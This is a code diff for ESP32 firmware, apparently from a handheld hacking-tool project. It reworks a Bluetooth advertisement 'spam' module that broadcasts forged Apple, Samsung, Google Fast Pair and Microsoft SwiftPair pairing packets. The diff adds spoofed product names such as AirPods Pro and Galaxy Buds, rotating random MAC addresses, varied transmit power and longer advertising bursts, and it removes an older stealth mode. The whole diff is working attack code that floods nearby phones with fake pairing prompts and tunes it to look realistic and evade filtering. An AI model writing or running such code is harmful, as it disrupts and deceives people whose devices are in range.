@@ -53,22 +53,19 @@ const uint8_t samsung_generic_ids[] = {
     0x39,0x3A,0x3B,0x3C
 };
 
-struct DeviceType {
-    uint32_t value;
-};
-
 const uint32_t enhanced_models[] = {
     0xCD8256, 0x0000F0, 0xF00000, 0x821F66, 0xF52494,
     0xAABBCC, 0x112233, 0x445566, 0x778899, 0x99AABB,
     0xCCDDEE, 0xFF1122, 0x334455, 0x667788, 0x8899AA,
-    0xBBCCDD, 0xEEFF11, 0x223344, 0x556677, 0x889900
+    0xBBCCDD, 0xEEFF11, 0x223344, 0x556677, 0x889900,
+    0x0017C8, 0x0017C9, 0x0017CA, 0x0017CB, 0x0017CC
 };
 
 const int ENHANCED_MODEL_COUNT = sizeof(enhanced_models) / sizeof(enhanced_models[0]);
 
 static uint32_t packet_counter = 0;
 static int64_t last_packet_time = 0;
-static int stealth_mode_counter = 0;
+static bool ble_initialized = false;
 BLEAdvertising *pAdvertising;
 
 void generateAntiSpamMac(uint8_t *mac) {
@@ -152,38 +149,21 @@ uint8_t* createEnhancedApplePacket(uint8_t deviceType, bool isContinuity = false
     }
 }
 
-int calculateRealisticDelay(EBLEPayloadType type) {
-    int baseDelay;
-    int variation = 0;
-    
+int calculateAdvertisingTime(EBLEPayloadType type) {
     switch(type) {
-        case AppleIOS:
-            baseDelay = 30;
-            variation = random(5, 25);
-            break;
-        case GoogleFastPair:
-            baseDelay = 60;
-            variation = random(10, 40);
-            break;
-        case Microsoft:
-            baseDelay = 35;
-            variation = random(5, 20);
-            break;
         case SamsungAll:
-            baseDelay = 40;
-            variation = random(5, 25);
-            break;
+            return 2000 + random(8000); // 2-10 seconds for Samsung
+        case GoogleFastPair:
+            return 3000 + random(7000); // 3-10 seconds for FastPair
+        case AppleIOS:
+            return 1500 + random(3500); // 1.5-5 seconds for Apple
+        case Microsoft:
+            return 2000 + random(6000); // 2-8 seconds for SwiftPair
         case NameFlood:
-            baseDelay = 15;
-            variation = random(3, 12);
-            break;
+            return 1000 + random(3000); // 1-4 seconds for name flood
         default:
-            baseDelay = 30;
-            variation = random(5, 15);
+            return 2000 + random(6000); // 2-8 seconds default
     }
-    
-    variation += (packet_counter % 15) * 2;
-    return baseDelay + variation;
 }
 
 BLEAdvertisementData getEnhancedFastPairData() {
@@ -193,7 +173,7 @@ BLEAdvertisementData getEnhancedFastPairData() {
     fastpair_counter++;
     
     uint32_t model = enhanced_models[fastpair_counter % ENHANCED_MODEL_COUNT];
-    int8_t rssi = -70 + (fastpair_counter % 41);
+    int8_t rssi = -60 + (fastpair_counter % 31);
     
     uint8_t Google_Data[16] = {
         0x03, 0x03, 0x2C, 0xFE, 
@@ -212,6 +192,11 @@ BLEAdvertisementData getEnhancedFastPairData() {
 #else
     AdvData.addData(std::string((char*)Google_Data, 16));
 #endif
+    
+    AdvData.setFlags(0x06);
+    
+    const char* fastpair_names[] = {"Pixel Buds", "JBL Tune", "Sony WH-1000", "Bose QC35", "Beats Studio"};
+    AdvData.setName(fastpair_names[fastpair_counter % 5]);
     
     return AdvData;
 }
@@ -252,6 +237,10 @@ BLEAdvertisementData GetUniversalAdvertisementData(EBLEPayloadType Type, int spe
                 continuityCounter++;
             }
             useDevicePacket = !useDevicePacket;
+            
+            AdvData.setFlags(0x06);
+            const char* apple_names[] = {"AirPods Pro", "AirPods", "AirPods Max", "AirTag", "Find My"};
+            AdvData.setName(apple_names[deviceIndex % 5]);
             break;
         }
         
@@ -296,6 +285,9 @@ BLEAdvertisementData GetUniversalAdvertisementData(EBLEPayloadType Type, int spe
 #else
             AdvData.addData(std::string((char *)AdvData_Raw, i));
 #endif
+            
+            AdvData.setFlags(0x06);
+            AdvData.setName(Name);
             break;
         }
         
@@ -339,6 +331,9 @@ BLEAdvertisementData GetUniversalAdvertisementData(EBLEPayloadType Type, int spe
             }
             
             AdvData.setManufacturerData(std::string((char*)samsungData, device_type == 1 ? 16 : 13));
+            AdvData.setFlags(0x06);
+            const char* samsung_names[] = {"Galaxy Buds", "Galaxy Watch", "SmartTag", "Galaxy SmartTag"};
+            AdvData.setName(samsung_names[device_type % 4]);
             break;
         }
         
@@ -383,37 +378,62 @@ BLEAdvertisementData GetUniversalAdvertisementData(EBLEPayloadType Type, int spe
     return AdvData;
 }
 
-void executeEnhancedSpam(EBLEPayloadType type) {
+void initBLE() {
+    if(!ble_initialized) {
+        BLEDevice::init("");
+        vTaskDelay(50 / portTICK_PERIOD_MS);
+        esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);
+        pAdvertising = BLEDevice::getAdvertising();
+        
+        // Set realistic advertising intervals (1-2 seconds)
+        pAdvertising->setMinInterval(0x800);  // 1.28 seconds
+        pAdvertising->setMaxInterval(0x1000); // 2.56 seconds
+        
+        ble_initialized = true;
+        vTaskDelay(20 / portTICK_PERIOD_MS);
+    }
+}
+
+void deinitBLE() {
+    if(ble_initialized) {
+        if(pAdvertising != nullptr) {
+            pAdvertising->stop();
+            vTaskDelay(20 / portTICK_PERIOD_MS);
+        }
+        BLEDevice::deinit(true);
+        ble_initialized = false;
+        pAdvertising = nullptr;
+        vTaskDelay(30 / portTICK_PERIOD_MS);
+    }
+}
+
+void executeRealisticSpam(EBLEPayloadType type) {
     uint8_t macAddr[6];
     generateAntiSpamMac(macAddr);
     
-    int actualDelay = calculateRealisticDelay(type);
+    int advertisingTime = calculateAdvertisingTime(type);
     
-    if(last_packet_time > 0) {
-        int64_t time_since_last = (esp_timer_get_time() - last_packet_time) / 1000;
-        if(time_since_last < 5) {
-            vTaskDelay((10 - time_since_last) / portTICK_PERIOD_MS);
-        }
+    if(!ble_initialized) {
+        initBLE();
     }
     
-    BLEDevice::init("");
-    vTaskDelay(3 / portTICK_PERIOD_MS);
+    vTaskDelay(10 / portTICK_PERIOD_MS);
     
-    int8_t tx_power_variation = (packet_counter % 5) - 2;
+    // Vary TX power slightly
+    int8_t tx_power_variation = (packet_counter % 9) - 4;
     int actual_power = MAX_TX_POWER + tx_power_variation;
     if(actual_power < ESP_PWR_LVL_N12) actual_power = ESP_PWR_LVL_N12;
     if(actual_power > MAX_TX_POWER) actual_power = MAX_TX_POWER;
     
     esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, (esp_power_level_t)actual_power);
     
-    pAdvertising = BLEDevice::getAdvertising();
-    
     BLEAdvertisementData advertisementData = GetUniversalAdvertisementData(type);
     
+    // Create scan response for better realism
     BLEAdvertisementData scanResponse = BLEAdvertisementData();
     if(random(100) < 70) {
         char local_name[16];
-        snprintf(local_name, sizeof(local_name), "Device_%04lX", (unsigned long)(esp_random() & 0xFFFF));
+        snprintf(local_name, sizeof(local_name), "Dev_%04lX", (unsigned long)(esp_random() & 0xFFFF));
         scanResponse.setName(local_name);
         
         uint32_t service_uuid = 0xFE95 + (packet_counter % 0x100);
@@ -421,75 +441,40 @@ void executeEnhancedSpam(EBLEPayloadType type) {
         snprintf(uuid_str, sizeof(uuid_str), "0000%04lX-0000-1000-8000-00805f9b34fb", (unsigned long)service_uuid);
         scanResponse.addServiceUUID(BLEUUID(uuid_str));
     }
-    pAdvertising->setScanResponseData(scanResponse);
     
-    pAdvertising->setAdvertisementData(advertisementData);
-    
-    pAdvertising->start();
-    vTaskDelay(actualDelay / portTICK_PERIOD_MS);
-    pAdvertising->stop();
-    
-    int cleanup_delay = 2 + (packet_counter % 4);
-    vTaskDelay(cleanup_delay / portTICK_PERIOD_MS);
-    
-    BLEDevice::deinit(false);
+    if(pAdvertising != nullptr) {
+        pAdvertising->stop();
+        vTaskDelay(10 / portTICK_PERIOD_MS);
+        
+        pAdvertising->setScanResponseData(scanResponse);
+        pAdvertising->setAdvertisementData(advertisementData);
+        
+        pAdvertising->start();
+        
+        // ADVERTISE FOR SECONDS, NOT MILLISECONDS!
+        vTaskDelay(advertisingTime / portTICK_PERIOD_MS);
+        
+        pAdvertising->stop();
+        vTaskDelay(10 / portTICK_PERIOD_MS);
+    }
     
     packet_counter++;
     last_packet_time = esp_timer_get_time();
     
-    if((packet_counter % 50) == 0) {
+    // Reinitialize BLE every 10 packets to change MAC
+    if((packet_counter % 10) == 0) {
+        deinitBLE();
         vTaskDelay(100 / portTICK_PERIOD_MS);
+        initBLE();
     }
-}
-
-void executeStealthSpam(EBLEPayloadType type) {
-    switch(stealth_mode_counter % 4) {
-        case 0:
-            executeEnhancedSpam(type);
-            break;
-        case 1: {
-            uint8_t macAddr[6];
-            generateAntiSpamMac(macAddr);
-            BLEDevice::init("");
-            esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_N12);
-            
-            pAdvertising = BLEDevice::getAdvertising();
-            
-            BLEAdvertisementData advertisementData = GetUniversalAdvertisementData(type);
-            pAdvertising->setAdvertisementData(advertisementData);
-            pAdvertising->start();
-            vTaskDelay(15 / portTICK_PERIOD_MS);
-            pAdvertising->stop();
-            BLEDevice::deinit(false);
-            
-            packet_counter++;
-            last_packet_time = esp_timer_get_time();
-            break;
-        }
-        case 2:
-            for(int i = 0; i < 3; i++) {
-                executeEnhancedSpam(type);
-                vTaskDelay(5 / portTICK_PERIOD_MS);
-            }
-            vTaskDelay(80 / portTICK_PERIOD_MS);
-            break;
-        case 3:
-            vTaskDelay(60 / portTICK_PERIOD_MS);
-            break;
-    }
-    
-    stealth_mode_counter++;
 }
 
 void executeCustomSpam(String spamName) {
-    uint8_t macAddr[6];
-    generateAntiSpamMac(macAddr);
+    if(!ble_initialized) {
+        initBLE();
+    }
     
-    BLEDevice::init("");
-    vTaskDelay(3 / portTICK_PERIOD_MS);
-    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);
-    
-    pAdvertising = BLEDevice::getAdvertising();
+    vTaskDelay(10 / portTICK_PERIOD_MS);
     
     BLEAdvertisementData advertisementData = BLEAdvertisementData();
     advertisementData.setFlags(0x06);
@@ -501,115 +486,94 @@ void executeCustomSpam(String spamName) {
     String service_uuid = String("0000") + service_str + "-0000-1000-8000-00805f9b34fb";
     advertisementData.setCompleteServices(BLEUUID(service_uuid.c_str()));
     
-    pAdvertising->setAdvertisementData(advertisementData);
-    pAdvertising->start();
-    vTaskDelay(25 / portTICK_PERIOD_MS);
-    pAdvertising->stop();
-    vTaskDelay(2 / portTICK_PERIOD_MS);
+    if(pAdvertising != nullptr) {
+        pAdvertising->stop();
+        vTaskDelay(10 / portTICK_PERIOD_MS);
+        
+        pAdvertising->setAdvertisementData(advertisementData);
+        pAdvertising->start();
+        
+        // Custom names also need longer advertising
+        vTaskDelay(3000 / portTICK_PERIOD_MS);
+        
+        pAdvertising->stop();
+        vTaskDelay(10 / portTICK_PERIOD_MS);
+    }
     
-    BLEDevice::deinit(false);
     packet_counter++;
     last_packet_time = esp_timer_get_time();
+    
+    if((packet_counter % 10) == 0) {
+        deinitBLE();
+        vTaskDelay(100 / portTICK_PERIOD_MS);
+        initBLE();
+    }
 }
 
 void aj_adv(int ble_choice) {
-    int timer = 0;
     int count = 0;
     String spamName = "";
     static int spam_all_index = 0;
     
     if (ble_choice == 5) { spamName = keyboard("", 10, "Name to spam"); }
-    timer = millis();
+    
+    initBLE();
+    vTaskDelay(100 / portTICK_PERIOD_MS);
     
     while (1) {
-        if (millis() - timer > 25) {
-            bool use_stealth = ((count % 15) >= 10);
-            
-            switch (ble_choice) {
-                case 0:
-                    displayTextLine("Apple iOS (" + String(count) + ")");
-                    if(use_stealth) {
-                        executeStealthSpam(AppleIOS);
-                    } else {
-                        executeEnhancedSpam(AppleIOS);
-                    }
-                    break;
-                case 1:
-                    displayTextLine("SwiftPair (" + String(count) + ")");
-                    if(use_stealth) {
-                        executeStealthSpam(Microsoft);
-                    } else {
-                        executeEnhancedSpam(Microsoft);
-                    }
-                    break;
-                case 2:
-                    displayTextLine("Samsung (" + String(count) + ")");
-                    if(use_stealth) {
-                        executeStealthSpam(SamsungAll);
-                    } else {
-                        executeEnhancedSpam(SamsungAll);
-                    }
-                    break;
-                case 3:
-                    displayTextLine("FastPair (" + String(count) + ")");
-                    if(use_stealth) {
-                        executeStealthSpam(GoogleFastPair);
-                    } else {
-                        executeEnhancedSpam(GoogleFastPair);
-                    }
-                    break;
-                case 4:
-                    displayTextLine("Spam All (" + String(count) + ")");
-                    switch(spam_all_index % 4) {
-                        case 0: 
-                            if(use_stealth) executeStealthSpam(AppleIOS);
-                            else executeEnhancedSpam(AppleIOS);
-                            break;
-                        case 1: 
-                            if(use_stealth) executeStealthSpam(SamsungAll);
-                            else executeEnhancedSpam(SamsungAll);
-                            break;
-                        case 2: 
-                            if(use_stealth) executeStealthSpam(Microsoft);
-                            else executeEnhancedSpam(Microsoft);
-                            break;
-                        case 3: 
-                            if(use_stealth) executeStealthSpam(GoogleFastPair);
-                            else executeEnhancedSpam(GoogleFastPair);
-                            break;
-                    }
-                    spam_all_index++;
-                    break;
-                case 5:
-                    displayTextLine("Custom Name (" + String(count) + ")");
-                    executeCustomSpam(spamName);
-                    break;
-                case 6:
-                    displayTextLine("Name Flood (" + String(count) + ")");
-                    if(use_stealth) {
-                        executeStealthSpam(NameFlood);
-                    } else {
-                        executeEnhancedSpam(NameFlood);
-                    }
-                    break;
-            }
-            count++;
-            timer = millis();
+        switch (ble_choice) {
+            case 0:
+                displayTextLine("Apple iOS (" + String(count) + ")");
+                executeRealisticSpam(AppleIOS);
+                break;
+            case 1:
+                displayTextLine("SwiftPair (" + String(count) + ")");
+                executeRealisticSpam(Microsoft);
+                break;
+            case 2:
+                displayTextLine("Samsung (" + String(count) + ")");
+                executeRealisticSpam(SamsungAll);
+                break;
+            case 3:
+                displayTextLine("FastPair (" + String(count) + ")");
+                executeRealisticSpam(GoogleFastPair);
+                break;
+            case 4:
+                displayTextLine("Spam All (" + String(count) + ")");
+                switch(spam_all_index % 4) {
+                    case 0: executeRealisticSpam(AppleIOS); break;
+                    case 1: executeRealisticSpam(SamsungAll); break;
+                    case 2: executeRealisticSpam(Microsoft); break;
+                    case 3: executeRealisticSpam(GoogleFastPair); break;
+                }
+                spam_all_index++;
+                break;
+            case 5:
+                displayTextLine("Custom Name (" + String(count) + ")");
+                executeCustomSpam(spamName);
+                break;
+            case 6:
+                displayTextLine("Name Flood (" + String(count) + ")");
+                executeRealisticSpam(NameFlood);
+                break;
         }
+        count++;
+        
+        // Small pause between devices
+        vTaskDelay(500 / portTICK_PERIOD_MS);
 
         if (check(EscPress)) {
-            if(pAdvertising != nullptr) {
-                pAdvertising->stop();
-                vTaskDelay(10 / portTICK_PERIOD_MS);
-            }
-            BLEDevice::deinit(true);
-            vTaskDelay(50 / portTICK_PERIOD_MS);
+            deinitBLE();
+            vTaskDelay(200 / portTICK_PERIOD_MS);
             returnToMenu = true;
             break;
         }
+        
+        // Allow UI updates
+        vTaskDelay(10 / portTICK_PERIOD_MS);
     }
     
     packet_counter = 0;
     last_packet_time = 0;
-    stealth_mode_counter = 0;
+    ble_initialized = false;
 }
